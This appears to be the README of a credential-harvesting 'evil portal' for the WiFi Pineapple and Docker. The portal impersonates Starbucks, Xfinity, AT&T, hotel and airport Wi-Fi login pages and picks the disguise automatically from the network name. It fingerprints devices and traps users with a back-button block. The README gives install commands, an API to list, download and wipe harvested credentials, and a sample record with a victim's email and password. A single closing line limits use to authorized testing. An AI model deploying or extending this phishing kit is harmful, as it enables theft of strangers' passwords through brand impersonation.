# Evil Portal Universal v3.0

A single-file, zero-dependency captive portal for WiFi Pineapple and Docker Desktop.
Works on any network. Universal design. No external CSS/JS files.

## What's Included

```
├── pineapple/
│   ├── MyPortal.php      # Native Pineapple module (extends evilportal\Portal)
│   ├── helper.php        # Management API
│   ├── config.json       # Runtime configuration
│   └── install.sh        # One-command Pineapple installer
├── docker/
│   ├── MyPortal.php      # Same portal class
│   ├── index.php         # Standalone entry point (includes Portal stub)
│   ├── helper.php        # Same API
│   ├── config.json       # Runtime configuration
│   ├── Dockerfile        # PHP 8.2 + Apache container
│   └── docker-compose.yml # One-command Docker runner
```

## Features

- **Universal Design** — Looks like any modern captive portal (not branded to one network)
- **Device Detection** — Shows Apple/Android/Windows/Mac/Linux icons automatically
- **Fingerprinting** — Captures screen size, timezone, hardware, plugins, language
- **Dark Mode** — Respects system preference on iOS/Android/desktop
- **Mobile-First** — Full-screen on phones, card layout on desktop
- **Self-Contained** — All CSS and JS are inline. No external files needed.
- **Loading States** — Button spinner, form shake on error
- **Back-Button Trap** — Prevents users from navigating away easily
- **7 Profiles** — default, starbucks, xfinity, att, spectrum, hotel, airport
- **Auto-SSID Detection** — Switches profile based on broadcast SSID keywords
- **Full API** — status, creds, logs, stats, clear, config, download

## WiFi Pineapple Install

### Option A: One-Liner (from extracted folder)
```bash
scp pineapple/MyPortal.php root@172.16.42.1:/root/pineapple/modules/EvilPortal/portals/
scp pineapple/helper.php root@172.16.42.1:/root/pineapple/modules/EvilPortal/
```

### Option B: Install Script
```bash
cd pineapple
sh install.sh
```

### Activate
1. Browser: `http://172.16.42.1:1471/`
2. **Modules → Evil Portal → Portal Library → MyPortal**
3. Click **Activate**

### Set Profile
```bash
# SSH into Pineapple, edit config:
vi /root/pineapple/modules/EvilPortal/config.json
```

```json
{"profile": "starbucks", "ssid": "Starbucks WiFi", "enabled": true}
```

## Docker Desktop Install

```bash
cd docker
docker-compose up --build
```

Open: `http://localhost/captiveportal/`

Test profiles: `http://localhost/captiveportal/?profile=xfinity`

## API Reference

| Endpoint | Method | Description |
|----------|--------|-------------|
| `?action=status` | GET | Module status, cred count, active profile |
| `?action=creds` | GET | All harvested credentials |
| `?action=logs` | GET | Last 200 access log entries |
| `?action=stats` | GET | Aggregated statistics |
| `?action=clear` | GET | Wipe all captured data |
| `?action=config` | GET/POST | Read/write configuration |
| `?action=download` | GET | Download creds.json as file |

### Examples

```bash
# Pineapple
curl http://172.16.42.1/captiveportal/helper.php?action=status
curl http://172.16.42.1/captiveportal/helper.php?action=creds

# Docker
curl http://localhost/captiveportal/helper.php?action=status
curl http://localhost/captiveportal/helper.php?action=download

# Set profile via API
curl -X POST -H "Content-Type: application/json"   -d '{"profile":"hotel","ssid":"Hilton_Guest"}'   http://localhost/captiveportal/helper.php?action=config
```

## Captured Data Format

```json
[
  {
    "timestamp": "2026-08-15T15:30:00+00:00",
    "ip": "192.168.1.105",
    "username": "victim@email.com",
    "password": "secret123",
    "fingerprint": "{"screen":{...},"nav":{...},"tz":"America/New_York"}",
    "profile": "default",
    "ua": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0...)"
  }
]
```

## Troubleshooting

**Portal not showing in Library?**
- Make sure Evil Portal module is installed from Pineapple Module Manager
- File must be at `/root/pineapple/modules/EvilPortal/portals/MyPortal.php`
- Refresh the Portal Library in the UI

**No credentials saved?**
- Check `/root/pineapple/modules/EvilPortal/logs/` exists and is writable
- Run: `chmod 755 /root/pineapple/modules/EvilPortal/logs`

**Docker won't start?**
- Make sure port 80 isn't in use: `sudo lsof -i :80`
- Try a different port: change `80:80` to `8080:80` in docker-compose.yml

## Legal

For authorized security testing and research only. Obtain written permission before deployment.
